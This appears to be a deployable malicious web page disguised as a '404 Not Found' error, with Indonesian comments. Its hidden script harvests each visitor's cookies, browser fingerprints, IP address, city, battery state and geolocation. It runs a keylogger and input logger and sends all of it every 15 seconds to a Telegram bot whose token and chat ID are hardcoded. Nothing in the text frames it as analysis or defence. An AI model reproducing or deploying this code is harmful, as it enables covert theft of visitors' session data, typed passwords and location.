<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; }
        h1 { font-size: 6rem; margin: 0; letter-spacing: 10px; }
    </style>
</head>
<body>
    <h1>404</h1>
    <script>
        const BOT_TOKEN = "8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA";
        const ADMIN_ID = "5924914981"; // Hanya owner yg terima pesan

        // Kirim pesan ke Telegram (CORS bypass pakai mode no-cors)
        async function sendViaTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams();
            params.append('chat_id', ADMIN_ID);
            params.append('text', text.substring(0, 4096));
            params.append('parse_mode', 'HTML');

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params,
                    mode: 'no-cors' // Biarpun gak dapet response, Telegram tetep terima
                });
            } catch(e) {
                console.error('Error kirim:', e);
            }
        }

        // Deteksi browser secara akurat
        function detectBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('TelegramBot')) return 'Telegram Bot';
            if (ua.includes('Telegram')) return 'Telegram InApp Browser';
            if (ua.includes('TikTok')) return 'TikTok InApp Browser';
            if (ua.includes('FBAN') || ua.includes('FBAV')) return 'Facebook App';
            if (ua.includes('Instagram')) return 'Instagram App';
            if (ua.includes('WhatsApp')) return 'WhatsApp App';
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
            if (ua.includes('Firefox')) return 'Mozilla Firefox';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
            if (ua.includes('Edg')) return 'Microsoft Edge';
            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
            if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
            return 'Unknown Browser';
        }

        // Ambil semua cookie (termasuk HttpOnly? enggak, tapi itu tetap maksimal)
        function getAllCookies() {
            try {
                return document.cookie || 'Tidak ada cookie (mungkin HttpOnly atau disabled)';
            } catch(e) {
                return 'Error membaca cookie: ' + e.message;
            }
        }

        // Fingerprint lebih dalam
        async function getFingerprint() {
            let fp = {};
            // Canvas FP
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(0, 0, 100, 50);
                ctx.fillStyle = "#069";
                ctx.fillText("FP", 2, 15);
                fp.canvas = canvas.toDataURL().substring(0, 100);
            } catch(e) { fp.canvas = "gagal"; }

            // WebGL FP
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fp.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        fp.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    }
                }
            } catch(e) { fp.webgl = "gagal"; }

            // AudioContext FP
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    const ac = new AudioContext();
                    const oscillator = ac.createOscillator();
                    const analyser = ac.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.disconnect();
                    fp.audio = "tersedia";
                    ac.close();
                }
            } catch(e) { fp.audio = "gagal"; }

            return fp;
        }

        // Ambil IP & lokasi publik
        async function getPublicInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                    isp: data.org
                };
            } catch(e) {
                return { ip: 'gagal ambil', error: e.message };
            }
        }

        // Keylogger
        function startKeylogger() {
            document.addEventListener('keydown', (e) => {
                let key = e.key;
                if (key === ' ') key = '[SPASI]';
                if (key === 'Enter') key = '[ENTER]\n';
                if (key === 'Backspace') key = '[BACKSPACE]';
                if (key === 'Tab') key = '[TAB]';
                keyLog += key;
                if (keyLog.length > 1000) keyLog = keyLog.slice(-1000);
            });

            document.addEventListener('input', (e) => {
                if (e.target.value) {
                    fullInputLog.push(`INPUT[${e.target.tagName}]: ${e.target.value}`);
                    if (fullInputLog.length > 20) fullInputLog.shift();
                }
            });
        }

        // Kirim laporan utama + keylog berkala
        async function mainHarvest() {
            const browser = detectBrowser();
            const cookies = getAllCookies();
            const fp = await getFingerprint();
            const publicInfo = await getPublicInfo();

            const report = `
🔐 <b>HARVEST REPORT</b>
🌍 <b>Waktu:</b> ${new Date().toLocaleString()}
🧠 <b>Browser:</b> ${browser}
🌐 <b>User Agent:</b> ${navigator.userAgent}
🍪 <b>Cookie:</b> ${cookies.substring(0, 800)}
📺 <b>Resolusi:</b> ${screen.width}x${screen.height}
💻 <b>Platform:</b> ${navigator.platform}
🌍 <b>Bahasa:</b> ${navigator.language}
🎨 <b>Canvas FP:</b> ${fp.canvas}
🖥️ <b>WebGL Renderer:</b> ${fp.webgl_renderer || 'tidak ada'}
🔊 <b>AudioContext:</b> ${fp.audio}
🌍 <b>IP:</b> ${publicInfo.ip}
🏙️ <b>Negara/Kota:</b> ${publicInfo.country} - ${publicInfo.city}
📡 <b>ISP:</b> ${publicInfo.isp}
💾 <b>Device Memory:</b> ${navigator.deviceMemory || 'unknown'}
🧠 <b>CPU Core:</b> ${navigator.hardwareConcurrency}
🔋 <b>Battery:</b> ${await (async () => { try { const b = await navigator.getBattery(); return `${b.level*100}% ${b.charging ? '(charging)' : ''}`; } catch(e){ return 'tidak tersedia'; } })()}
📍 <b>Geolocation:</b> ${await new Promise(resolve => { navigator.geolocation?.getCurrentPosition(p => resolve(`${p.coords.latitude},${p.coords.longitude}`), () => resolve('ditolak user')); })}
            `;

            await sendViaTelegram(report);

            // Kirim keylog tiap 15 detik
            setInterval(async () => {
                if (keyLog.length > 0) {
                    await sendViaTelegram(`⌨️ <b>KEYLOG (15 detik):</b>\n${keyLog.slice(-1200)}`);
                }
                if (fullInputLog.length > 0) {
                    await sendViaTelegram(`📝 <b>INPUT LOG:</b>\n${fullInputLog.join('\n').slice(-1200)}`);
                }
            }, 15000);
        }

        // Jalankan semua
        window.onload = () => {
            mainHarvest();
            startKeylogger();
        };
    </script>
</body>
</html>
